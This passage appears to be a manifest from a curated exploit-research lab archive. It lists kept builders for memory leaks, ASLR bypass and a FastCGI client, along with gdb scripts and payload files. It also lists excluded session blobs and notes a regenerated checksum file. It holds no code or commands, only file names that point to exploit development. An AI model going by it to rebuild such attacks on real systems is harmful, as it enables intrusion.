`root54/`/`root56/` and `aslr54/`/`aslr56/` lab docroots and their session
records, `sess54/`, the small `sess56/` records (below 256 KB), the four builders
(`analyze_leak.py`, `fcgi_client.py`, `mk_leak.py`, `mk_native_aslr.py`), the
root `gdb5*.txt` command files and `lab.env`.

Not copied: `run/` (pid files only), `multipart.bin` (raw upload body),
`phase/multipart.bin`, `phase/__pycache__/`, and the three multi-MB calibration
session blobs `sess56/sess_big` (2,097,437 B), `sess56/sess_s16` (1,638,685 B)
and `sess56/sess_s19` (1,966,365 B), which are reproducible from the kept
builders; the decisive records are the kept `phase/*.payload`,
`phase/aslr*_session_leak.bin` and small `sess56/*` files. No credentials, app
trees, tarballs, pid files, `__pycache__` or request bodies with secrets are
present.

`SHA256SUMS` is regenerated for this curated set and verifies with
`sha256sum -c SHA256SUMS`.
